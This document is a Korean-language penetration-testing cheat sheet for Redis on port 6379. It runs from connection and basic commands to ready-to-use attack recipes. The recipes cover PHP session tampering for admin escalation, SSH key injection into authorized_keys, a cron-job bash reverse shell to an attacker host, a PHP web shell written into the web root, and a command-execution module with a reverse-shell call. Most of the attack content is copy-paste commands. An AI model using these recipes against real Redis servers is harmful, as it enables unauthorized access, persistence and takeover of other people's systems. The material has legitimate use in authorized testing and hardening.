---
sidebar_position: 6
---

# Redis - 6379

Redis 인메모리 데이터베이스 연결 및 공격 기법 모음입니다.

## 연결 방법

### redis-cli

```bash
# 로컬 연결
redis-cli

# 원격 연결
redis-cli -h <RHOST>
redis-cli -h <RHOST> -p 6379

# 비밀번호 인증
redis-cli -h <RHOST> -a <PASSWORD>
```

### 인증

```bash
# 연결 후 인증
AUTH <PASSWORD>
AUTH <USERNAME> <PASSWORD>  # Redis 6.0+
```

## 기본 명령어

### 서버 정보

```bash
INFO                    # 전체 정보
INFO SERVER            # 서버 정보
INFO CLIENTS           # 클라이언트 정보
INFO MEMORY            # 메모리 정보
INFO PERSISTENCE       # 지속성 정보
INFO STATS             # 통계
INFO REPLICATION       # 복제 정보
INFO CPU               # CPU 정보
INFO KEYSPACE          # 키스페이스 정보
INFO CLUSTER           # 클러스터 정보
```

### 설정 확인

```bash
CONFIG GET *           # 모든 설정
CONFIG GET dir         # 작업 디렉토리
CONFIG GET dbfilename  # DB 파일명
CONFIG GET requirepass # 비밀번호 설정
```

### 설정 변경

```bash
CONFIG SET dir /tmp
CONFIG SET dbfilename backup.db
CONFIG SET requirepass <PASSWORD>
```

### 데이터베이스 선택

```bash
SELECT 0               # DB 0 선택 (기본 16개 DB)
SELECT 1
INFO KEYSPACE         # 사용 중인 DB 확인
```

## 키 관리

### 키 조회

```bash
KEYS *                # 모든 키 (주의: 프로덕션에서 사용 금지)
SCAN 0                # 커서 기반 스캔
DBSIZE                # 키 개수
EXISTS <KEY>          # 키 존재 확인
TYPE <KEY>            # 키 타입 확인
```

### 값 조회

```bash
GET <KEY>             # String 값 가져오기
MGET <KEY1> <KEY2>    # 여러 키 한번에
```

### 값 설정

```bash
SET <KEY> <VALUE>
SET mykey "Hello"
MSET key1 "value1" key2 "value2"
```

### 키 삭제

```bash
DEL <KEY>
FLUSHDB               # 현재 DB의 모든 키 삭제
FLUSHALL              # 모든 DB의 모든 키 삭제
```

## Hash 데이터 구조

```bash
HSET <KEY> <FIELD> <VALUE>     # 해시 필드 설정
HGET <KEY> <FIELD>             # 해시 필드 값 가져오기
HKEYS <KEY>                     # 모든 필드 이름
HGETALL <KEY>                   # 모든 필드와 값
HVALS <KEY>                     # 모든 값
```

## 세션 하이재킹

### PHP 세션 조작

```bash
# 세션 확인
GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b

# 세션 수정 (권한 상승)
SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:5:\"admin\";role|s:5:\"admin\";auth|s:4:\"True\";"

# 주의: s:5는 문자열 길이 (admin = 5글자)
```

## SSH 키 주입

### 공격 시나리오

Redis가 루트 권한으로 실행 중이고 `/root/.ssh/` 쓰기 권한이 있을 때:

```bash
# 1. Redis 연결
redis-cli -h <RHOST>

# 2. (선택) 기존 데이터 삭제
FLUSHALL

# 3. SSH 공개키 준비
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

# 4. Redis에 키 저장
cat key.txt | redis-cli -h <RHOST> -x set ssh-key

# 5. 키 확인
GET ssh-key

# 6. 작업 디렉토리 확인
CONFIG GET dir

# 7. 디렉토리를 .ssh로 변경
CONFIG SET dir /var/lib/redis/.ssh
# 또는
CONFIG SET dir /root/.ssh

# 8. 파일명을 authorized_keys로 설정
CONFIG SET dbfilename authorized_keys

# 9. 디스크에 저장
SAVE

# 10. SSH 접속
ssh -i ~/.ssh/id_rsa redis@<RHOST>
```

## 웹셸 작성

### Cron Job을 통한 Reverse Shell

```bash
# 1. Cron 디렉토리로 변경
CONFIG SET dir /var/spool/cron/crontabs

# 2. 파일명 설정
CONFIG SET dbfilename root

# 3. Cron Job 작성
SET 1 "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n"

# 4. 저장
SAVE
```

### 웹 디렉토리에 웹셸 작성

```bash
# 1. 웹 디렉토리로 변경
CONFIG SET dir /var/www/html

# 2. 파일명 설정
CONFIG SET dbfilename shell.php

# 3. 웹셸 작성
SET webshell "<?php system($_GET['cmd']); ?>"

# 4. 저장
SAVE

# 5. 접근
curl http://<RHOST>/shell.php?cmd=id
```

## 모듈을 통한 RCE

### RedisModules-ExecuteCommand

> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

```bash
# 1. 모듈 컴파일
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make

# 2. 모듈 업로드 및 로드
# (Redis에 파일 업로드 후)
MODULE LOAD /path/to/module.so

# 3. 명령 실행
system.exec "id"
system.exec "whoami"
system.rev_shell <LHOST> <LPORT>
```

## Lua 스크립트 실행

```bash
EVAL "return redis.call('GET', 'mykey')" 0
EVAL "return 'Hello World'" 0
```

## 백업 및 복구

### 백업

```bash
SAVE                  # 동기 저장
BGSAVE               # 백그라운드 저장
LASTSAVE             # 마지막 저장 시간
```

### RDB 파일 위치

```bash
CONFIG GET dir
CONFIG GET dbfilename
```

## 보안 점검

### 인증 확인

```bash
# 비밀번호 없이 접속 시도
redis-cli -h <RHOST>
INFO
```

### 위험한 명령어 확인

```bash
CONFIG GET rename-command  # 명령어 이름 변경 확인
```

## 정보 수집

### 버전 확인

```bash
INFO SERVER
```

### 클라이언트 목록

```bash
CLIENT LIST
CLIENT GETNAME
```

### 메모리 사용량

```bash
INFO MEMORY
MEMORY STATS
```

## 참고

- Redis는 기본적으로 6379 포트 사용
- 기본 설정에서 인증 없이 접근 가능할 수 있음
- `KEYS *`는 프로덕션에서 사용 금지 (블로킹)
- `SAVE`는 동기식이므로 서버 블로킹 발생
- Redis 6.0부터 ACL 및 사용자 관리 지원
- SSH 키 주입은 루트 권한 필요
- 웹셸 작성은 웹 디렉토리 쓰기 권한 필요
- 모듈 로드는 높은 권한 필요
- RDB 파일을 통한 지속성 공격 가능
